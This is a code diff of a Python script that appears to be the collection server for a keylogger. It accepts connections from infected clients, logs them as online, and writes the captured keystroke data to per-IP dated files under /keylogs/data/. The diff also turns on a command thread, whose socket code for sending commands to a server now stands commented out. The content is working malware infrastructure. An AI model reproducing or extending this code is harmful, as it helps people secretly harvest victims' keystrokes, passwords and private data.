@@ -48,14 +48,16 @@ def chrono():
                 kill_all()
 
 
-def commands(cmd):
-    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+def commands():
+    while True :
+        cmd = input(">>>")
+        print(cmd)
 
-    client_socket.connect((SRV, PORT))
 
-    client_socket.send(cmd.encode('utf-8'))  # envoi
-
-    client_socket.close()
+    #client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    #client_socket.connect((SRV, PORT))
+    #client_socket.send(cmd.encode('utf-8'))  # envoi
+    #client_socket.close()
 
 
 def receiver(port):
@@ -71,7 +73,7 @@ def receiver(port):
         client_socket, client_address = server_socket.accept()
         print(f"{client_address} - ONLINE")
 
-        ficname = f"{client_address[0]}-{datetime.date.today()}.txt"
+        ficname = f"{client_address[0]}-{datetime.date.today()}-keyboard.txt"
         # recu data
         with open("/keylogs/data/" + ficname, "a") as f:
             data = client_socket.recv(1024)
@@ -120,6 +122,6 @@ if __name__ == '__main__':
 
         receiver_t.start()
 
-    # commands_t = threading.Thread(target=commands)
+        commands_t = threading.Thread(target=commands)
 
-    # commands_t.start()
+        commands_t.start()
